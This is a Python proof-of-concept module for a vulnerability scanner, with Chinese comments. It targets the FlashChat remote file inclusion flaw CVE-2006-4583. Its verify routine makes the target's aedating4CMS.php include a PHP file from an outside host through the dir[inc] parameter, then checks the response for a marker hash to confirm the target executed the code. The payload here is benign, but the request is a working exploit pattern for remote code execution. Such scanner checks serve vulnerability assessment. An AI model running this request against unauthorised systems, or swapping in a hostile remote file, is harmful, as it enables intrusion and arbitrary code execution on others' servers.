
# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'FlashChat_0000'  # 平台漏洞编号
    # 漏洞名称
    name = 'FlashChat <= 4.5.7 (aedating4CMS.php) Remote File Include Vulnerability'
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RFI  # 漏洞类型
    disclosure_date = '2006-09-06'  # 漏洞公布时间
    desc = '''
        FlashChat在处理用户请求时存在输入验证漏洞，远程攻击者可能利用此漏洞以Web进程权限执行任意命令。
        FlashChat的/inc/cmses/aedating4CMS.php、/inc/cmses/aedatingCMS.php和/inc/cmses/aedatingCMS2.php脚本
        没有正确验证dir[inc]变量用户输入，远程攻击者通过包含本地或外部资源的任意文件导致执行任意脚本代码。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-63921'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2006-4583'  # cve编号
    product = 'FlashChat'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e8f7db4a-5005-4c66-a2ac-b423dfbc5b98'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 远程文件内容是<?php echo md5('3.1416');?>
            payload = 'http://www.sqlsec.com/admin.html'
            # 漏洞测试地址
            expUrl = arg+'/inc/cmses/aedating4CMS.php?dir[inc]='+payload
            try:
                response = requests.get(expUrl, timeout=50)
                match = re.search(
                    '765635a65f5919b89a990aaf0cb168d7', response.text)
                if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
            except Exception as e:
                self.output.info('执行异常{}'.format(e))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
